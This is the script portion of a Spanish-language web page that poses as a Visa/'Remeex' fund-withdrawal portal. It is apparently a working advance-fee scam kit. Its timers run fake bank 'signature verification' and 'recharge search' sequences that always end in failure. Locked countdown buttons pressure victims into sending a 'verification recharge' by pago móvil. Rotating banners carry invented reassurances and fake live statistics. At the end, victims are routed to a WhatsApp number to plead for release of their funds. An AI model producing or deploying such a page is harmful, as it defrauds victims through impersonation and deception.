    if (!signatureCanvas) return;

    ctx = signatureCanvas.getContext("2d");
    resizeSignatureCanvas();

    // Eventos Mouse
    signatureCanvas.addEventListener("mousedown", startDraw);
    signatureCanvas.addEventListener("mousemove", draw);
    signatureCanvas.addEventListener("mouseup", endDraw);
    signatureCanvas.addEventListener("mouseleave", endDraw);

    // Eventos Táctiles
    signatureCanvas.addEventListener("touchstart", startDrawTouch, { passive: false });
    signatureCanvas.addEventListener("touchmove", drawTouch, { passive: false });
    signatureCanvas.addEventListener("touchend", endDrawTouch);
  }

  function resizeSignatureCanvas() {
    if (!signatureCanvas) return;
    signatureCanvas.width = signatureCanvas.offsetWidth;
    signatureCanvas.height = signatureCanvas.offsetHeight;
  }
  
  function isCanvasEmpty() {
    if (!ctx) return true;
    
    const pixelBuffer = new Uint32Array(
      ctx.getImageData(0, 0, signatureCanvas.width, signatureCanvas.height).data.buffer
    );
    
    return !pixelBuffer.some(color => color !== 0);
  }
  
  function startDraw(e) {
    isDrawing = true;
    ctx.beginPath();
    ctx.moveTo(e.offsetX, e.offsetY);
  }
  
  function draw(e) {
    if (!isDrawing) return;
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(e.offsetX, e.offsetY);
    ctx.stroke();
  }
  
  function endDraw() {
    isDrawing = false;
    ctx.closePath();
  }
  
  function getTouchPos(e) {
    const rect = signatureCanvas.getBoundingClientRect();
    return {
      x: e.touches[0].clientX - rect.left,
      y: e.touches[0].clientY - rect.top
    };
  }
  
  function startDrawTouch(e) {
    e.preventDefault();
    isDrawing = true;
    ctx.beginPath();
    const pos = getTouchPos(e);
    ctx.moveTo(pos.x, pos.y);
  }
  
  function drawTouch(e) {
    e.preventDefault();
    if (!isDrawing) return;
    const pos = getTouchPos(e);
    ctx.lineWidth = 2;
    ctx.lineCap = "round";
    ctx.strokeStyle = "#000";
    ctx.lineTo(pos.x, pos.y);
    ctx.stroke();
  }
  
  function endDrawTouch(e) {
    e.preventDefault();
    isDrawing = false;
    ctx.closePath();
  }

  /****************************************************
   * Secuencia de firma mejorada con múltiples pasos
   ****************************************************/
  function startSecuenciaFirma() {
    // Resetear variables
    firmaSecuenciaStep = 0;
    if (secuenciaFirmaInterval) clearInterval(secuenciaFirmaInterval);
    
    // Configurar y mostrar overlay
    showOverlay("overlaySecuenciaFirma");
    const titulo = document.getElementById("secuenciaFirmaTitulo");
    const texto = document.getElementById("secuenciaFirmaTexto");
    const logo = document.getElementById("secuenciaFirmaLogo");
    const progressBar = document.getElementById("secuenciaFirmaProgress");
    
    // Inicializar progreso
    progressBar.style.width = "0%";
    
    // Establecer logo del banco
    logo.src = logoBancoUsuario;
    
    // Definir los textos para cada paso
    const secuenciaTextos = [
      {
        titulo: "Iniciando análisis de firma",
        texto: "Estableciendo conexión con el sistema de verificación. Por favor, espere...",
        progreso: 12
      },
      {
        titulo: "Conectando con el banco...",
        texto: "Estableciendo canal seguro con " + (bancoUsuario || "tu banco") + " para verificar tu identidad.",
        progreso: 25
      },
      {
        titulo: "Procesando firma digital",
        texto: "Analizando trazos y características de tu firma para la verificación...",
        progreso: 38
      },
      {
        titulo: "Consultando registros bancarios",
        texto: "Comparando con la firma registrada en " + (bancoUsuario || "tu banco") + "...",
        progreso: 50
      },
      {
        titulo: "Análisis biométrico en curso",
        texto: "Verificando puntos de coincidencia y patrones de escritura...",
        progreso: 62
      },
      {
        titulo: "Realizando verificación avanzada",
        texto: "Ejecutando algoritmos de reconocimiento para validar tu identidad...",
        progreso: 75
      },
      {
        titulo: "Firma no coincide",
        texto: "Se han detectado discrepancias importantes entre tu firma y la registrada en el sistema.",
        progreso: 88,
        error: true
      },
      {
        titulo: "Verificación adicional requerida",
        texto: "Por seguridad, necesitaremos un proceso adicional para confirmar tu identidad.",
        progreso: 100,
        error: true
      }
    ];
    
    // Mostrar el primer paso
    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    progressBar.style.width = secuenciaTextos[0].progreso + "%";
    
    // Iniciar la secuencia
    secuenciaFirmaInterval = setInterval(() => {
      firmaSecuenciaStep++;
      
      if (firmaSecuenciaStep < secuenciaTextos.length) {
        // Actualizar contenido
        const step = secuenciaTextos[firmaSecuenciaStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        progressBar.style.width = step.progreso + "%";
        
        // Si es un paso de error, cambiar el color de la barra de progreso
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        // Fin de la secuencia
        clearInterval(secuenciaFirmaInterval);
        hideOverlay("overlaySecuenciaFirma");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");
        
        // Mostrar siguiente pantalla
        hideVisaCard("signatureVerification");
        showVisaCard("securityVerification1");
        startSecurity1Countdown();
      }
    }, 15000); // 15 segundos por paso
  }

  /****************************************************
   * Contadores
   ****************************************************/
  function startSecurity1Countdown() {
    const btn = document.getElementById("continueSecurityBtn1");
    const cdLabel = document.getElementById("countdownSecurity1");
    let timer = securityVerification1Countdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }

  function startSecurity2Countdown() {
    const btn = document.getElementById("continueSecurityBtn2");
    const cdLabel = document.getElementById("countdownSecurity2");
    let timer = securityVerification2Countdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Disponible en ${timer} segundos...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }

  function startSecurity3ACountdown() {
    const btn = document.getElementById("continueSecurity3ABtn");
    const cdLabel = document.getElementById("countdownSecurity3A");
    let timer = security3ACountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Lee detenidamente y espera ${timer} segundos para continuar...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }

  function startSecurity3BCountdown() {
    const btn = document.getElementById("continueSecurity3BBtn");
    const cdLabel = document.getElementById("countdownSecurity3B");
    let timer = security3BCountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Disponible en ${timer} segundos...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes continuar ahora";
      }
    }, 1000);
  }

  function startRecargaReadyCountdown() {
    const btn = document.getElementById("recargaReadyBtn");
    const cdLabel = document.getElementById("countdownRecargaReady");
    let timer = recargaReadyBtnCountdown; // 180 s
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        recargaReadyBtnEnabled = true;
        btn.disabled = false;
        cdLabel.textContent = "¿Ya has realizado la recarga? Haz clic en continuar";
      }
    }, 1000);
  }

  function startConfirmRecargaCountdown() {
    const btn = document.getElementById("confirmRecargaBtn");
    const cdLabel = document.getElementById("countdownRecargaConfirm");
    let timer = confirmRecargaBtnCountdown;
    btn.disabled = true;
    btn.classList.add("btn-disabled");
    cdLabel.textContent = `Verificando datos. Disponible en ${timer} segundos...`;
    
    const interval = setInterval(() => {
      timer--;
      cdLabel.textContent = `Verificando datos. Disponible en ${timer} segundos...`;
      if (timer <= 0) {
        clearInterval(interval);
        btn.classList.remove("btn-disabled");
        btn.disabled = false;
        cdLabel.textContent = "Puedes confirmar ahora";
      }
    }, 1000);
  }

  /****************************************************
   * NUEVA VERSIÓN de startVerificandoRecarga (MEJORADA)
   ****************************************************/
  function startVerificandoRecarga() {
    // Resetear variables
    recargaSecuenciaStep = 0;
    if (verificandoRecargaInterval) clearInterval(verificandoRecargaInterval);
    
    // Mostrar overlay
    showOverlay("overlayVerificandoRecarga");
    const titulo = document.getElementById("verificandoRecargaTitulo");
    const texto = document.getElementById("verificandoRecargaTexto");
    const logo = document.getElementById("verificandoRecargaLogo");
    const progressBar = document.getElementById("verificandoRecargaProgress");
    
    // Inicializar progreso
    progressBar.style.width = "0%";
    
    // Configurar logo
    logo.src = logoBancoUsuario;
    
    // Recuperar la tasa y el monto mínimo
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
    let montoMinimo = 20; // Valor por defecto

    if (datosRemeex.password) {
      const pass = datosRemeex.password;
      if (pass.length >= 10) {
        montoMinimo = parseInt(pass.slice(-4, -2), 10) || montoMinimo;
      }
    }

    const montoRecarga = montoMinimo * tasaCambio;
    
    // Definir los textos para cada paso
    const secuenciaTextos = [
      {
        titulo: "Iniciando verificación...",
        texto: `Conectando con el sistema de verificación para buscar tu recarga de ${formatNumberVE(montoRecarga)} Bs.`,
        progreso: 12
      },
      {
        titulo: "Consultando movimientos recientes",
        texto: "Analizando las operaciones recientes en tu cuenta bancaria...",
        progreso: 24
      },
      {
        titulo: "Verificando pago móvil",
        texto: `Buscando tu recarga de ${formatNumberVE(montoRecarga)} Bs en el sistema interbancario...`,
        progreso: 36
      },
      {
        titulo: "Comprobando titularidad",
        texto: "Validando que coincida con tus datos bancarios registrados...",
        progreso: 48
      },
      {
        titulo: "Consultando con el banco emisor",
        texto: "Verificando detalles adicionales de la operación de recarga...",
        progreso: 60
      },
      {
        titulo: "Realizando verificación adicional",
        texto: "Examinando información complementaria de seguridad...",
        progreso: 72
      },
      {
        titulo: `No encontramos tu recarga de ${formatNumberVE(montoRecarga)} Bs`,
        texto: "No se detectan movimientos con el monto exacto en los últimos minutos.",
        progreso: 84,
        error: true
      },
      {
        titulo: "Verificación manual requerida",
        texto: "Necesitamos que completes la información de tu recarga manualmente.",
        progreso: 100,
        error: true
      }
    ];
    
    // Mostrar el primer paso
    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    progressBar.style.width = secuenciaTextos[0].progreso + "%";
    
    // Iniciar la secuencia
    verificandoRecargaInterval = setInterval(() => {
      recargaSecuenciaStep++;
      
      if (recargaSecuenciaStep < secuenciaTextos.length) {
        const step = secuenciaTextos[recargaSecuenciaStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        progressBar.style.width = step.progreso + "%";
        
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        clearInterval(verificandoRecargaInterval);
        hideOverlay("overlayVerificandoRecarga");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");
        
        // Mostrar pantalla de entrada manual de datos
        showVisaCard("recargaSection");
        startConfirmRecargaCountdown();
      }
    }, 15000);
  }

  /****************************************************
   * Secuencia Final Mejorada (después de confirmar recarga)
   ****************************************************/
  function startSecuenciaFinal() {
    secuenciaFinalStep = 0;
    if (secuenciaFinalInterval) clearInterval(secuenciaFinalInterval);
    
    // Mostrar overlay
    showOverlay("overlaySecuenciaFinal");
    const titulo = document.getElementById("secFinalTitulo");
    const texto = document.getElementById("secFinalTexto");
    const logo = document.getElementById("secFinalLogo");
    const progressBar = document.getElementById("secuenciaFinalProgress");
    
    progressBar.style.width = "0%";
    logo.src = logoBancoUsuario;
    
    // Recuperar la tasa y el monto mínimo
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
    let montoMinimo = 20;

    if (datosRemeex.password) {
      const pass = datosRemeex.password;
      if (pass.length >= 10) {
        montoMinimo = parseInt(pass.slice(-4, -2), 10) || montoMinimo;
      }
    }

    const montoRecarga = montoMinimo * tasaCambio;
    
    const secuenciaTextos = [
      {
        titulo: "Procesando información",
        texto: "Verificando datos del comprobante de recarga...",
        progreso: 12
      },
      {
        titulo: `Buscando recarga de ${formatNumberVE(montoRecarga)} Bs`,
        texto: "Consultando en el sistema bancario los últimos movimientos...",
        progreso: 24
      },
      {
        titulo: "Validando datos de tu cuenta",
        texto: `Verificando cuenta ${numeroCuenta || "bancaria"} en ${bancoUsuario || "tu banco"}...`,
        progreso: 36
      },
      {
        titulo: "Preparando tu depósito",
        texto: `Confirmando transacción de tus fondos a ${bancoUsuario || "tu banco"}...`,
        progreso: 48
      },
      {
        titulo: "Analizando información adicional",
        texto: "Validando datos de seguridad para procesar el depósito...",
        progreso: 60
      },
      {
        titulo: "Verificación de comprobante en curso",
        texto: "Procesando información del comprobante proporcionado...",
        progreso: 72
      },
      {
        titulo: "Recarga no encontrada",
        texto: `No encontramos el movimiento exacto de ${formatNumberVE(montoRecarga)} Bs en el sistema.`,
        progreso: 84,
        error: true
      },
      {
        titulo: "Verificación adicional requerida",
        texto: "Necesitamos validación adicional para procesar tu retiro.",
        progreso: 100,
        error: true
      }
    ];
    
    titulo.textContent = secuenciaTextos[0].titulo;
    texto.textContent = secuenciaTextos[0].texto;
    progressBar.style.width = secuenciaTextos[0].progreso + "%";
    
    secuenciaFinalInterval = setInterval(() => {
      secuenciaFinalStep++;
      
      if (secuenciaFinalStep < secuenciaTextos.length) {
        const step = secuenciaTextos[secuenciaFinalStep];
        titulo.textContent = step.titulo;
        texto.textContent = step.texto;
        progressBar.style.width = step.progreso + "%";
        
        if (step.error) {
          progressBar.classList.add("error");
          titulo.style.color = "var(--danger)";
        }
      } else {
        clearInterval(secuenciaFinalInterval);
        hideOverlay("overlaySecuenciaFinal");
        titulo.style.color = "var(--primary)";
        progressBar.classList.remove("error");
        
        // Mostrar overlay de error final
        showOverlay("overlayErrorFinal");
        configurarWhatsAppLink();
      }
    }, 15000);
  }

  /****************************************************
   * Overlay Firma No Coincide (con redirección)
   ****************************************************/
  function mostrarOverlayFirmaNoCoincide() {
    const firmaNoCoincideLogo = document.getElementById("firmaNoCoincideLogo");
    const firmaNoCoincideTexto = document.getElementById("firmaNoCoincideTexto");
    const redirectProgressBar = document.getElementById("redirectProgressBar");
    const redirectCountdown = document.getElementById("redirectCountdown");

    firmaNoCoincideLogo.src = logoBancoUsuario;
    firmaNoCoincideTexto.textContent = `Necesitamos que vuelvas a firmar para continuar con el proceso de retiro de ${formatNumberVE(saldoDisponible)} Bs a tu cuenta en ${bancoUsuario || "tu banco"}. Este paso es necesario para garantizar la seguridad de la transacción.`;
    
    hideOverlay("overlayProcesoRetiro");
    showOverlay("overlayFirmaNoCoincide");
    
    let tiempoRestante = 10;
    redirectCountdown.textContent = tiempoRestante;
    redirectProgressBar.style.width = "0%";
    
    redirectCountdownInterval = setInterval(() => {
      tiempoRestante--;
      redirectCountdown.textContent = tiempoRestante;
      
      const progreso = (10 - tiempoRestante) * 10;
      redirectProgressBar.style.width = `${progreso}%`;
      
      if (tiempoRestante <= 0) {
        clearInterval(redirectCountdownInterval);
        isRedirecting = true;
        window.location.href = "retiroremeex.html";
      }
    }, 1000);
  }

  function configurarWhatsAppLink() {
    const whatsappLink = document.getElementById("whatsappLink");
    if (!whatsappLink) return;
    
    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
    let montoMinimo = 20;

    if (datosRemeex.password) {
      const pass = datosRemeex.password;
      if (pass.length >= 10) {
        montoMinimo = parseInt(pass.slice(-4, -2), 10) || montoMinimo;
      }
    }

    const montoRecarga = montoMinimo * tasaCambio;
    
    const msg = encodeURIComponent(
      `Hola, soy ${nombreCompleto || "cliente"}, con documento ${documentoBeneficiario || "pendiente"}. ` +
      `No se encontró mi recarga de verificación por ${formatNumberVE(montoRecarga)} Bs y necesito ` +
      `ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario || "mi banco"}.`
    );
    
    whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;
    
    whatsappLink.addEventListener("click", function(){
      setTimeout(function(){
        window.location.href = "https://visa.es";
      }, 120000);
    });
  }

  /****************************************************
   * Utilidades auxiliares y funciones de UI
   ****************************************************/
  function showVisaCard(id) {
    const card = document.getElementById(id);
    if (card) {
      card.classList.add("active");
      card.style.display = "block";
    }
  }
  
  function hideVisaCard(id) {
    const card = document.getElementById(id);
    if (card) {
      card.classList.remove("active");
      card.style.display = "none";
    }
  }
  
  function showOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) overlay.classList.add("active");
  }
  
  function hideOverlay(id) {
    const overlay = document.getElementById(id);
    if (overlay) overlay.classList.remove("active");
    if (id === "overlayFirmaNoCoincide" && redirectCountdownInterval) {
      clearInterval(redirectCountdownInterval);
      redirectCountdownInterval = null;
    }
  }

  function formatNumberVE(num) {
    return Number(num).toLocaleString("es-VE", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    });
  }

  function toggleBalanceCurrency() {
    const balanceAmountElem = document.getElementById("balanceAmount");
    const currentText = balanceAmountElem.textContent;
    
    if (showingBs) {
      const numericBs = parseFloat(
        currentText
          .replace(/\./g, '')
          .replace(',', '.')
          .replace(' Bs.', '')
          .trim()
      );
      
      if (!isNaN(numericBs)) {
        const usdValue = numericBs / exchangeRate;
        balanceAmountElem.textContent = usdValue.toLocaleString("en-US", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        }) + " USD";
      }
    } else {
      let saldoSessionStorage = sessionStorage.getItem("currentBalanceBS");
      if (saldoSessionStorage) {
        balanceAmountElem.textContent = saldoSessionStorage;
      } else {
        balanceAmountElem.textContent = formatNumberVE(saldoDisponible) + " Bs.";
      }
    }
    
    showingBs = !showingBs;
  }

  function startStatusBannerRotation() {
    const banner = document.getElementById("statusBanner");
    if (!banner) return;
    
    const statusMessages = [
      "Todo listo",
      "Preparando la entrega de fondos a tu cuenta",
      "Última parada, completa los últimos pasos para retirar tus fondos",
      "Sincronizando con tu banco",
      "Tu retiro está en la fase final",
      "Todo va perfecto",
      "Tu banco ya está procesando el pago",
      "Buenas noticias",
      "Tu solicitud está confirmada",
      "Tu dinero llega en cualquier momento",
      "Preparando tu depósito",
      "Verificación de firma en proceso",
      "Comunicándonos con tu banco",
      "Procesando tu solicitud",
      "Pronto tendrás tu dinero"
    ];
    
    let currentIndex = 0;
    banner.textContent = statusMessages[currentIndex];
    
    setInterval(() => {
      banner.style.opacity = 0;
      setTimeout(() => {
        currentIndex = (currentIndex + 1) % statusMessages.length;
        banner.textContent = statusMessages[currentIndex];
        banner.style.opacity = 1;
      }, 500);
    }, 10000);
  }

  function startParticleGeneration() {
    const particleContainer = document.getElementById("particleContainer");
    if (!particleContainer) return;
    
    setInterval(() => {
      createParticle(particleContainer);
    }, 600);
  }

  function createParticle(container) {
    const particle = document.createElement("div");
    particle.classList.add("particle");
    
    const yOffset = Math.random() * container.offsetHeight;
    const size = Math.random() * 8 + 5;
    
    particle.style.width = size + "px";
    particle.style.height = size + "px";
    particle.style.bottom = "-10px";
    particle.style.left = "-10px";
    particle.style.transform = `translateY(${(container.offsetHeight - yOffset)}px)`;
    
    container.appendChild(particle);
    
    particle.addEventListener("animationend", () => {
      particle.remove();
    });
  }

  function startRotatingInfo() {
    const rotatingInfoElem = document.getElementById("rotatingInfo");
    if (!rotatingInfoElem) return;
    
    const infoMessages = [
      "Usuarios activos: 347",
      "Tiempo de actualización: 12:35:20",
      "Tiempo estimado de disponibilidad: 15:45",
      "Sistema OK <span class='led-green'></span>",
      "Procesando datos del banco...",
      "Verificación de seguridad en curso",
      "Conexión segura establecida",
      "Transacción preparada"
    ];
    
    let infoIndex = 0;
    rotatingInfoElem.innerHTML = infoMessages[infoIndex];

    setInterval(() => {
      rotatingInfoElem.style.opacity = 0;
      setTimeout(() => {
        infoIndex = (infoIndex + 1) % infoMessages.length;
        rotatingInfoElem.innerHTML = infoMessages[infoIndex];
        rotatingInfoElem.style.opacity = 1;
      }, 500);
    }, 8000);
  }

  /****************************************************
   * Función para copiar texto al portapapeles
   ****************************************************/
  function copyToClipboard(elementId) {
    let text;
    
    if (elementId === 'conceptoRecarga') {
      text = document.getElementById(elementId).textContent;
    } else if (elementId === 'verificacionNumero' || elementId === 'verificacionNumeroModal') {
      text = document.getElementById(elementId).textContent;
    } else if (elementId === 'verificacionRif' || elementId === 'verificacionRifModal') {
      text = document.getElementById(elementId).textContent;
    } else if (elementId === 'verificacionMonto' || elementId === 'verificacionMontoModal') {
      text = document.getElementById(elementId).textContent;
    } else if (elementId === 'conceptoRecargaModal') {
      text = document.getElementById(elementId).textContent;
    } else if (typeof elementId === 'string' && !document.getElementById(elementId)) {
      // Si es una cadena directa y no un ID
      text = elementId;
    } else {
      // Caso predeterminado: buscar por ID
      text = document.getElementById(elementId).textContent;
    }
    
    if (!text) return;
    
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text)
        .then(() => {
          const notification = document.createElement("div");
          notification.textContent = "Copiado al portapapeles";
          notification.style.position = "fixed";
          notification.style.bottom = "20px";
          notification.style.left = "50%";
          notification.style.transform = "translateX(-50%)";
          notification.style.padding = "10px 16px";
          notification.style.background = "#1a1f71";
          notification.style.color = "white";
          notification.style.borderRadius = "8px";
          notification.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
          notification.style.zIndex = "2000";
          notification.style.opacity = "0";
          notification.style.transition = "opacity 0.3s ease-in-out";
          
          document.body.appendChild(notification);
          
          setTimeout(() => {
            notification.style.opacity = "1";
          }, 10);
          
          setTimeout(() => {
            notification.style.opacity = "0";
            setTimeout(() => {
              document.body.removeChild(notification);
            }, 300);
          }, 2000);
        })
        .catch(err => {
          fallbackCopy(text);
        });
    } else {
      fallbackCopy(text);
    }
  }
  
  function fallbackCopy(text) {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.style.position = "fixed";
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    
    try {
      const successful = document.execCommand('copy');
      if (successful) {
        alert("Texto copiado: " + text);
      } else {
        alert("No se pudo copiar el texto");
      }
    } catch (err) {
      alert("Error al copiar: " + err);
    }
    document.body.removeChild(textarea);
  }
</script>

<!-- Script Tawk.to para soporte en vivo -->
<script>
  var Tawk_API = Tawk_API || {},
      Tawk_LoadStart = new Date();
  (function () {
    var s1 = document.createElement("script"),
        s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    s1.src = "https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj";
    s1.charset = "UTF-8";
    s1.setAttribute("crossorigin", "*");
    s0.parentNode.insertBefore(s1, s0);
  })();
</script>

</body>
</html>